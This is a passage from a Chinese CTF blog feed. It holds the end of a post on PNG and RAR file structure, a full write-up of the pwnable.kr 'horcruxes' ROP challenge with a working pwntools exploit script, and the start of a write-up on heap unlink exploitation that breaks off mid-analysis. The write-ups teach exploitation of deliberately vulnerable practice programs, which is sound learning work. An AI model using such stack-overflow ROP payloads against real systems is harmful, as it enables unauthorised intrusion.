href="https://blog.csdn.net/sinat_26472165/article/details/85342766">JPEG文件二进制格式分析</a></li></ul><h2 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h2><p>PNG文件结构很简单，主要有数据块(Chunk Block)组成，最少包含4个数据块。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/18/1o7rIWiunaCMzJO.png"></p><h3 id="PNG图像标识符"><a href="#PNG图像标识符" class="headerlink" title="PNG图像标识符"></a>PNG图像标识符</h3><p>根据PNG文件的定义来说，其文件头位置总是由位固定的字节来描述的：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/18/KqGYNAgUdTaIRj3.png"></p><h3 id="IHDR数据块"><a href="#IHDR数据块" class="headerlink" title="IHDR数据块"></a>IHDR数据块</h3><p>文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p><p>文件头数据块由13字节组成，它的格式如下表所示：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/19/VXgWyMTHaLqzc5S.png"></p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/19/xgKY8Q3NC4ZlWa1.png"></p><ul><li>00 00 00 0D：IHDR头块长为13</li><li>49 48 44 52：IHDR标识</li><li>00 00 13 40：图像的宽</li><li>00 00 0C C0：图像的高</li><li>44 6D AD B8：CRC校验</li></ul><h3 id="IEND图像结束数据"><a href="#IEND图像结束数据" class="headerlink" title="IEND图像结束数据"></a>IEND图像结束数据</h3><p>它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p><p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/19/mcpf8ue2hl7DKYg.png"></p><p>由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。</p><h2 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h2><h3 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h3><p>rar 无加密状态下，压缩包里面每个文件前都有文件头表示 0x74</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200314190010.png"></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200314190033.png"></p><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://my.oschina.net/ososchina/blog/801358">PNG图片文件结构分析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> 文件结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.kr horcruxes</title>
      <link href="archives/550dc1c0/"/>
      <url>archives/550dc1c0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这题考的是ROP系统攻击。百度百科是这样介绍的：</p><blockquote><p><strong>简介</strong>：ROP全称为Return-oriented Programming（面向返回的编程）。是一种基于代码复用的攻击技术，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。</p><p><strong>内在特征</strong>：1. ROP控制流中，call和ret指令不操纵函数，而是用于将函数里面的短指令序列的执行流串起来，但在正常的程序中，call和ret分别代表函数的开始和结束；2. ROP控制流中，jmp指令在不同的库函数甚至不同的库之间跳转，攻击者抽取的指令序列可能取自任意一个二进制文件的任意一个位置，这很不同于正常程序的执行。比如，函数中部提取出的jmp短指令序列，可将控制流转向其他函数的内部；而正常程序执行的时候，jmp指令通常在同一函数内部跳转。</p><p><strong>防范措施</strong>：ROP攻击的程序主要使用栈溢出的漏洞，实现程序控制流的劫持。因此栈溢出漏洞的防护是阻挡ROP攻击最根源性的方法。如果解决了栈溢出问题，ROP攻击将会在很大程度上受到抑制。</p></blockquote><p>总结ROP就是主要利用栈溢出，操纵call、ret、jmp指令，实现程序控制流的劫持，跳转到任意一个位置。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><strong>ssh <a href="mailto:&#x68;&#x6f;&#114;&#99;&#114;&#117;&#120;&#101;&#115;&#64;&#x70;&#x77;&#x6e;&#x61;&#98;&#108;&#101;&#x2e;&#107;&#114;">&#x68;&#x6f;&#114;&#99;&#114;&#117;&#120;&#101;&#115;&#64;&#x70;&#x77;&#x6e;&#x61;&#98;&#108;&#101;&#x2e;&#107;&#114;</a> -p2222 (pw:guest)</strong></p><p>题目只给了程序，没有给源码，那就放ida或gdb查看。程序保护只有NX（不能在栈上运行）</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/03/K3ujbGtC8qQdAa4.png"></p><p>readme里面主要是告诉我们，编译好的程序运行在机子的9032端口，运行用户是horcruxes-pwn。</p><p>本地运行需要安装32位libseccomp库：<code>apt-get install libseccomp-dev:i386</code></p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><blockquote><p>图中ida截图部分函数名被替换及注释</p></blockquote><p>main函数里面有大量的seccomp函数，查了一下是linux的沙箱之类的，这里看不懂是什么操作就先略过。welcome_borad里面是输出提示语段；</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/03/x9CGUg53p7ANqD1.png"></p><p>重点来看看init_ABCDEFG()！首先从/dev/urandom里面读取4byte到buf。然后利用buf作为种子生成7个随机数，根据公式运算得到ABCDEFG的值。其中sum为7个数字之和。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/03/tvHGlOeb53P7JCB.png"></p><p>初始化7个数后，main函数调用函数<code>ropme()</code>。函数伪C如下。</p><p>第一次（第8 9行）我们输入值与生成的7个数对比，如果相同则调用对应的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">int ropme()</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; &#x2F;&#x2F; [esp+4h] [ebp-74h]</span><br><span class="line">  int v2; &#x2F;&#x2F; [esp+68h] [ebp-10h]</span><br><span class="line">  int fd; &#x2F;&#x2F; [esp+6Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Select Menu:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">  getchar();</span><br><span class="line">  if ( v2 &#x3D;&#x3D; a )</span><br><span class="line">  &#123;</span><br><span class="line">    A();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; b )</span><br><span class="line">  &#123;</span><br><span class="line">    B();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; c )</span><br><span class="line">  &#123;</span><br><span class="line">    C();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; d )</span><br><span class="line">  &#123;</span><br><span class="line">    D();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; e )</span><br><span class="line">  &#123;</span><br><span class="line">    E();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; f )</span><br><span class="line">  &#123;</span><br><span class="line">    F();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; g )</span><br><span class="line">  &#123;</span><br><span class="line">    G();</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;How many EXP did you earned? : &quot;);</span><br><span class="line">    gets(s);</span><br><span class="line">    if ( atoi(s) &#x3D;&#x3D; sum )</span><br><span class="line">    &#123;</span><br><span class="line">      fd &#x3D; open(&quot;flag&quot;, 0);</span><br><span class="line">      s[read(fd, s, 0x64u)] &#x3D; 0;</span><br><span class="line">      puts(s);</span><br><span class="line">      close(fd);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;You&amp;#039;d better get more experience to kill Voldemort&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们审查<code>A()</code>函数，其余6个数大同小异。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/03/i7Tj2ZqEocaIzXv.png"></p><p>当调用<code>A()</code>时，函数返回一段字符串，其中包含<code>a</code>的初始值。</p><p>我们在反观<code>ropme()</code>函数，我们第二次（第41行）的值，与sum对比（7个数之和），如果相同则打印出flag。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在<code>ropme()</code>下的第41行<code>gets()</code>可以造成栈溢出，结合题目提示：这是一题rop攻击的例题。</p><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>利用<code>gets()</code>造成栈溢出覆盖<code>ropme()</code>返回地址，将地址覆盖为函数中的<strong>第44行</strong>，也就是flag。</p><p>程序只开启了NX，我们也不是利用shellcode，看上去是可行的。但是实测，无法返回到<code>ropme()</code>的任何一行。查看溢出覆盖后<code>ropme()</code>的返回地址为非预期地址。谷歌一圈发现是：</p><p><strong><code>0xa</code>会被<code>gets</code>当作输入结束的信号(回车)，并且把<code>0xa</code>替换成<code>0x00</code>(\0)，最终导致没办法直接返回到<code>ropme()</code>函数中去。</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://i.imgur.com/bHiAxwe.png" alt="img"></p><h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>就是把生成的7个值都找出来求和一下就可以了。这里我一开始就踩了坑，看到<code>init_ABCDEFG()</code>在生成随机时，种子是从<code>/dev/urandom</code>中读取的，然后就天真认为每次生成的7个值都是一样的，实际上人家不是伪随机数QAQ。我们利用这个脚本，再次验证一样（虽然事实如此）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">payload = &amp;<span class="comment">#039;a&amp;#039;*120 + p32(0x809fe4b)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">p = remote(&amp;<span class="comment">#039;pwnable.kr&amp;#039;,9032)</span></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;Select Menu:&amp;#039;)</span></span><br><span class="line">p.sendline(&amp;<span class="comment">#039;1&amp;#039;)</span></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;earned? : &amp;#039;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;(EXP +&amp;#039;)</span></span><br><span class="line">sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>也就是说我们需要一次性得到7个随机数。我们看下<code>A()</code>汇编代码：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/04/qHD8UC5AkJL1yuR.png"></p><p><code>A()</code>汇编中的<code>retn</code>相当于<code>pop eip、pop cs</code>，即<code>pop eip</code>之后，执行<code>eip</code>指向的指令。</p><p>我们是通过覆盖了<code>ropme()</code>的返回地址为<code>A()</code>。也就是说<code>A()</code>的返回地址则是<code>ropme()</code>返回地址+4。我们用一个图描述一下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/04/yK8AufbzHLX75Tl.png"></p><p>利用这一点，只用我们依次覆写7个函数的地址，就能自动读取到<code>EXP</code>。</p><p>那么现在的问题就变成了，如何返回到<code>ropme()</code>函数。前面我们已经得知了，因为<code>ropme()</code>内存地址特殊，无法跳转，但是<code>ropme()</code>是在<code>main()</code>函数中被调用过的，那么我们可以跳转到<code>main()</code>函数中的这一行。</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># 不明原因需要多运行几次直到flag出来</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">payload = &amp;<span class="comment">#039;a&amp;#039;*(0x74+4) # s到eip上距离</span></span><br><span class="line"><span class="comment"># ABCDEFG调用地址</span></span><br><span class="line">payload += p32(<span class="number">0x809FE4B</span>)+p32(<span class="number">0x809FE6A</span>)+p32(<span class="number">0x809FE89</span>)+p32(<span class="number">0x809FEA8</span>)+p32(<span class="number">0x809FEC7</span>)+p32(<span class="number">0x809FEE6</span>)+p32(<span class="number">0x809FF05</span>)</span><br><span class="line"><span class="comment"># ropme调用地址</span></span><br><span class="line">payload += p32(<span class="number">0x0809FFFC</span>)</span><br><span class="line"></span><br><span class="line">p = remote(&amp;<span class="comment">#039;pwnable.kr&amp;#039;,9032)</span></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;Select Menu:&amp;#039;)</span></span><br><span class="line">p.sendline(&amp;<span class="comment">#039;1&amp;#039;)</span></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;earned? : &amp;#039;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">exp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    p.recvuntil(&amp;<span class="comment">#039;(EXP +&amp;#039;)</span></span><br><span class="line">    exp += <span class="built_in">int</span>(p.recvline().replace(&amp;<span class="comment">#039;)&amp;#039;,&amp;quot;&amp;quot;).strip())</span></span><br><span class="line"><span class="built_in">print</span> exp</span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;Select Menu:&amp;#039;)</span></span><br><span class="line">p.sendline(&amp;<span class="comment">#039;1&amp;#039;)</span></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;earned? : &amp;#039;)</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(exp))</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>ROP通常利用栈溢出，操纵call、ret、jmp指令，实现程序控制流的劫持，跳转到任意一个位置。</li><li><code>gets()</code>结束输入的标记是<code>0xa(回车)</code>，并将其替换为<code>\0</code>。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://muirelle.com/2018/12/30/Pwnable-kr/">muirelle</a></p><p><a href="https://bbs.pediy.com/thread-249324.htm">pwnable.kr horcruxes ROP利用</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> ROP </tag>
            
            <tag> Pwnable.kr </tag>
            
            <tag> horcruxes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.kr unlink</title>
      <link href="archives/12117287/"/>
      <url>archives/12117287/</url>
      
        <content type="html"><![CDATA[<h2 id="预习知识"><a href="#预习知识" class="headerlink" title="预习知识"></a>预习知识</h2><h3 id="什么是unlinked"><a href="#什么是unlinked" class="headerlink" title="什么是unlinked"></a>什么是unlinked</h3><p>unlinked 是堆溢出中的一种常见形式，通过将双向列表中的空闲块拿出来与将要free的物理相邻的块进行合并。（将双向链表上的chunk卸载下来与物理chunk合并）</p><h4 id="unlink漏洞条件"><a href="#unlink漏洞条件" class="headerlink" title="unlink漏洞条件"></a>unlink漏洞条件</h4><p>有3个以上的空闲chunk链表，其中最前面的chunk存在有堆溢出</p><h4 id="unlink的触发"><a href="#unlink的触发" class="headerlink" title="unlink的触发"></a>unlink的触发</h4><p>当使用free函数释放正在使用的chunk时，会相应地检查其相邻的chunk是否空闲。如果空间则将相邻的chunk与free的chunk进行合并。</p><p>unlink有两个安全检测机制，都是针对chunk的header部分。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/09/29/skBJaGIeO2LDSmp.png"></p><blockquote><ul><li>prev_size:记录上一chunk的大小</li><li>size:记录当前chunk的大小</li><li>fd:在链表中指向下一个空闲chunk</li><li>bk:在链表中指向上一个空闲chunk</li></ul></blockquote><p><strong>判断一</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(chunksize (p) !&#x3D; prev_size (next_chunk (p)))</span><br></pre></td></tr></table></figure><p>此判断所代表的含义为检查将从链表中卸下的chunk其size是否被恶意的修改。记录当前size的地方有两处一个是为当前chunk的size字段和下一个chunk(物理地址上相邻的高地址的chunk)的prev_size字段如果这两个字段的值不等，则unlink会抛出异常。</p><p><strong>判断二</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(__builtin_expect (fd-&gt;bk !&#x3D; p || bk-&gt;fd !&#x3D; p, 0))</span><br></pre></td></tr></table></figure><p>这是检查当前chunk的前面一个chunk的bk、后面一个chunk的fd是否指向当前chunk，如果有其中之一不符合，则unlink会抛出异常。</p><h4 id="unlink解链原理"><a href="#unlink解链原理" class="headerlink" title="unlink解链原理"></a>unlink解链原理</h4><p><img src= "/img/loading.gif" data-lazy-src="https://anquan.baidu.com/upload/ue/image/20190222/1550819912485582.jpg" alt="2.jpg"></p><pre><code>FD=P-&gt;fd即当前空闲chunk所指向的下一个空闲chunkBK=P-&gt;bk即当前空闲chunk所指向的上一个chunkFD-&gt;bk=BK&lt;=&gt;P-&gt;fd-&gt;bk= P-&gt;bkBK-&gt;fd=FD&lt;=&gt;P-&gt;bk-&gt;fd= P-&gt;fd</code></pre><h4 id="unlink引发漏洞原理"><a href="#unlink引发漏洞原理" class="headerlink" title="unlink引发漏洞原理"></a>unlink引发漏洞原理</h4><p><strong>Dword shoot</strong>一种漏洞溢出技巧。漏洞是在双向链表chunk删除时，出现的一种漏洞类型。在进行双向链表的操作过程中，有溢出等的情况下，删除的chunk的fd、bk两个指针被恶意的改写的话，就会在链表删除的时候发生的漏洞。<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190414200335569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Nob3BwZXJDUA==,size_16,color_FFFFFF,t_70" alt="img"></p><p>unlink 卸载chunk时，会对chunk 的fd、bk指针进行操作，就是因为这个操作我们可以利用堆溢出控制，进行unlink的chunk的fd、bk指针。</p><p>如果双向链表的2个指针被修改的话，一般由于修改数据，或者控制程序的跳转。shellcode无法放入这么小的空间中。</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;stdio.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;stdlib.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;string.h&amp;gt;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(&amp;quot;/bin/sh&amp;quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* B)</span></span>&#123;</span><br><span class="line">OBJ* BK;</span><br><span class="line">OBJ* FD;</span><br><span class="line"></span><br><span class="line">BK=B-&amp;gt;bk;FD=B-&amp;gt;fd;</span><br><span class="line"></span><br><span class="line">FD-&amp;gt;bk=BK;BK-&amp;gt;fd=FD;</span><br><span class="line"><span class="comment">//[B-&amp;gt;bk]-&amp;gt;fd被B-&amp;gt;fd值覆写</span></span><br><span class="line"><span class="comment">//[B-&amp;gt;fd]-&amp;gt;bk被B-&amp;gt;bk覆写</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line"><span class="comment">// double linked list: A &amp;lt;-&amp;gt; B &amp;lt;-&amp;gt; C</span></span><br><span class="line">A-&amp;gt;fd = B;</span><br><span class="line">B-&amp;gt;bk = A;</span><br><span class="line">B-&amp;gt;fd = C;</span><br><span class="line">C-&amp;gt;bk = B;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(&amp;quot;here is <span class="built_in">stack</span> address leak: %p\n&amp;quot;, &amp;amp;A);</span><br><span class="line"><span class="built_in">printf</span>(&amp;quot;here is heap address leak: %p\n&amp;quot;, A);</span><br><span class="line"><span class="built_in">printf</span>(&amp;quot;now that you have leaks, get shell!\n&amp;quot;);</span><br><span class="line"><span class="comment">// heap overflow!</span></span><br><span class="line">gets(A-&amp;gt;buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit this unlink!</span></span><br><span class="line">unlink(B);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>概述一下程序运行思路：申请ABC三个大小为0x10的chunk；将ABC之间相互串联起来，形成一个空闲chunk链表（链接方式看下图）。接着答应出chunk A的栈地址、堆地址。之后从A buf后写入我们输入的数据，对B调用unlink函数，将B在链表上卸载下来。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/09/29/U1NvB3YsmtbJXDH.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>最明显的一点就是<code>get(A-&gt;buf)</code>存在堆溢出的情况。结合题目给予我们的提示：unlink。存在溢出和有unlink出现，我们就能构造出两个任意指向的指针（fd、bk）。</p><p>我们先来看看unlink函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* B)</span></span>&#123;</span><br><span class="line">OBJ* BK;</span><br><span class="line">OBJ* FD;</span><br><span class="line"></span><br><span class="line">BK=B-&amp;gt;bk;</span><br><span class="line">    FD=B-&amp;gt;fd;</span><br><span class="line">FD-&amp;gt;bk=BK;</span><br><span class="line">    BK-&amp;gt;fd=FD;</span><br><span class="line"><span class="comment">//[B-&amp;gt;bk]-&amp;gt;fd被B-&amp;gt;fd值覆写</span></span><br><span class="line"><span class="comment">//[B-&amp;gt;fd]-&amp;gt;bk被B-&amp;gt;bk覆写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先来解读一下unlink是怎么释放一个chunk的。我们就用下图中堆块解释：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/09/29/zTsGIFCKBnh32lP.png"></p><p>我们先将四条转换方程式化简一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">B-&gt;fd-&gt;bk &#x3D; B-&gt;bk</span><br><span class="line">B-&gt;bk-&gt;fd &#x3D; B-&gt;fd</span><br></pre></td></tr></table></figure><p><code>B-&gt;bk</code>   =   <code>0x1030</code>；<code>B-&gt;fd</code>   =   <code>0x1010</code>；都是存储着内存地址的变量。换句话说就是<code>B-&gt;bk</code> <code>B-&gt;fd</code>都是地址值。</p><p><code>B-&gt;fd-&gt;bk </code>   =   <code>*((B-&gt;fd)+bk)</code>   =<code>*(0x1010+4)</code>；<code>B-&gt;bk-&gt;fd</code>   =   <code>*((B-&gt;bk)+fd)</code>   =   <code>*(0x1030+0)</code>；可以看见现在变成了指针，而不是上面的地址值，而是一个指针。</p><p>那么最后的运算结果是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="number">0x1010</span>+<span class="number">4</span>) = <span class="number">0x1030</span><span class="comment">//0x1014（前一个chunk的bk）的值被覆盖为0x1010</span></span><br><span class="line">*(<span class="number">0x1030</span>+<span class="number">0</span>) = <span class="number">0x1010</span><span class="comment">//0x1030（后一个chunk的fd）的值被覆盖为0x1010</span></span><br></pre></td></tr></table></figure><p>unlink之后的chunk指针就如同最下行所示。</p><p><img src= "/img/loading.gif" data-lazy-src="https://anquan.baidu.com/upload/ue/image/20190222/1550819912485582.jpg" alt="2.jpg"></p><p>我们初定的利用思路是：利用unlink和堆溢出，创造出两个所我们所控制的任意指针，然后将程序控制流控制到shell上。将shellcode写到堆上，然后覆盖返回指针到堆上的方法不可行。因为程序开启了NX，堆栈上数据不能运行。而且程序中也有现成的shell。</p><p><img src= "/img/loading.gif" data-lazy-src="https://images2015.cnblogs.com/blog/1071926/201707/1071926-20170714154547056-1917497079.png" alt="img"></p><p>做到这里就有点进行不下去，主要是不知覆盖那个函数的返回地址，来控制程序流。查看别人writeup，发现关键点在这里：</p><p><img src= "/img/loading.gif" 